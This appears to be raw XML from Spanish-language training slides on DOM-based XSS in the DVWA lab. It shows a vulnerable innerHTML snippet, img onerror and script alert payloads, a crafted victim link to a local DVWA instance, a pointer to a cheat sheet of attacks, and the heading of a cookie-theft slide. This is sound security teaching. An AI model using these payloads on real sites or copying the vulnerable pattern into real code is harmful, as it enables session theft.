            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>results</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>results</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>');</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="450215" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>results.innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = 'You searched for: ' + search;</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Podemos añadir la siguiente información en el elemento</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>=1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>='/* Bad stuff here... </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>*/'&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Y como la imagen que intenta localizar no existe, se ejecutará el “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>” y, por lo tanto, el script que pongamos en él.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40022997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58739" y="71383"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS-DOM- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cheat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sheet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> / chuleta</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{795CD4BF-B4D0-9C81-4295-0FFC4F9F9689}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="530259" y="944071"/>
            <a:ext cx="10829040" cy="957313"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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En la siguiente </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0563C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>URL</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podemos encontrar una gran base de datos de posibles ataques</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>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Por ejemplo, para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iframe</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puedes usar el evento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onkeydown</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5" name="Imagen 4" descr="Interfaz de usuario gráfica&#10;&#10;Descripción generada automáticamente con confianza media">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AB50405-4AD9-C4D2-BBE2-1C407B78A720}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="360549" y="1901383"/>
            <a:ext cx="7013546" cy="3500175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5" descr="Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A8E18E2-C9D1-043F-86FD-439C50357127}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5564400" y="3186260"/>
            <a:ext cx="6267052" cy="3207958"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16011571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35968" y="110934"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS DOM Low </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>security</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="335968" y="1096382"/>
            <a:ext cx="6340963" cy="49732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Modificar la configuración </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>default_security_level</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sudo vi /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>config.inc.php</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="16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En el nivel Low se puede atacar por </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Enviar enlace similar al correcto al usuario</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1200" dirty="0"/>
              <a:t>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert(1)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7847F643-B0FA-ADCA-CC1D-9FB3BB099AA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7545609" y="2001789"/>
            <a:ext cx="3305636" cy="1800476"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Imagen 11" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8EAC70E-26AC-EEF6-A457-536B731FE91A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1711885" y="4005076"/>
            <a:ext cx="7584514" cy="2158340"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Imagen 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{47F6B392-5D5F-5002-5D3E-82062D4FA0A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7630883" y="972630"/>
            <a:ext cx="4021707" cy="824183"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18916121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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS DOM Robando la cookie-Low</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
